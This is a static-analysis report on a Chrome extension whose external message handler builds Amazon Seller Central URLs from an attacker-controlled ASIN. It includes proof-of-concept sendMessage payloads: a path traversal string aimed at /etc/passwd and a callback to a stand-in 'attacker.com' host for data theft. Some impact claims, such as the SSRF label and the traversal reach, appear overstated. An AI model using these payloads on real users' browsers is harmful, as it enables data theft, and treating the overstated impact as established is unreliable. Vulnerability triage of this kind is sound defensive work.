# CoCo Analysis: fdedlfmbbkkiegikmmdnbdlfkdgldkok

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 (all same vulnerability)

---

## Sink: bg_chrome_runtime_MessageExternal → jQuery_get_url_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fdedlfmbbkkiegikmmdnbdlfkdgldkok/opgen_generated_files/bg.js
Line 1185: `Sellercentral.search({ asin: request.asin }, function (e) { sendResponse(e) });`
Lines 1032, 1048: URL construction using attacker-controlled ASIN

**Code:**

```javascript
// Background script - External message handler (bg.js line 1183)
chrome.runtime.onMessageExternal.addListener(function (request, sender, sendResponse) {
    if (request.cmd == "restricted") {
        Sellercentral.search({ asin: request.asin }, function (e) { sendResponse(e) }); // ← attacker-controlled
    } else if (request.cmd == "checkout") {
        Sellercentral.search({ asin: "B006WCN96M" }, function (e) { sendResponse(e) });
    }
});

// Sellercentral.search implementation (line 1027-1065)
var Sellercentral = function () {
    var e = function (t, e) {
        var n = t.asin, // ← attacker-controlled
            o = "https://sellercentral.amazon.com/productsearch?q=" + n; // ← URL construction
        "cmbikghplblniljjffnoljbmmphlfdbl" == chrome.runtime.id && (o = "/tmp/" + n + ".html");
        var i = Cache.get(o);
        i ? e(i) : $.get(o).done(function (n) { // ← SSRF sink
            // ... process response and send back to attacker via sendResponse
        })
    },
    r = function (e, r) {
        var a = e.asin, // ← attacker-controlled
            o = "https://sellercentral.amazon.com/productsearch/search?query=" + a; // ← URL construction
        "cmbikghplblniljjffnoljbmmphlfdbl" == chrome.runtime.id && (o = "/tmp/" + a + ".json");
        var i = Cache.get(o);
        i ? r(i) : $.get(o).done(function (e) { // ← SSRF sink
            // ... process response and send back to attacker via sendResponse
        })
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a webpage on https://legendaryseller.com/*
chrome.runtime.sendMessage(
    'fdedlfmbbkkiegikmmdnbdlfkdgldkok',
    {
        cmd: 'restricted',
        asin: '../../../etc/passwd' // Path traversal attempt
    },
    function(response) {
        console.log('Response:', response);
    }
);

// Or SSRF to internal services via URL parameter manipulation:
chrome.runtime.sendMessage(
    'fdedlfmbbkkiegikmmdnbdlfkdgldkok',
    {
        cmd: 'restricted',
        asin: 'B00EXAMPLE?callback=http://attacker.com/steal'
    },
    function(response) {
        console.log('Response:', response);
    }
);
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. An attacker controlling a website on `https://legendaryseller.com/*` can inject arbitrary values into the ASIN parameter, which is used to construct URLs for privileged fetch requests to `sellercentral.amazon.com`. The attacker can:
1. Manipulate query parameters to exfiltrate data to attacker-controlled servers
2. Potentially access internal Amazon seller central pages the user has access to
3. Receive the response data via the sendResponse callback

The extension has broad permissions (`*://*.amazon.com/`, `*://*.amazon.co.uk/`) that enable these privileged cross-origin requests.
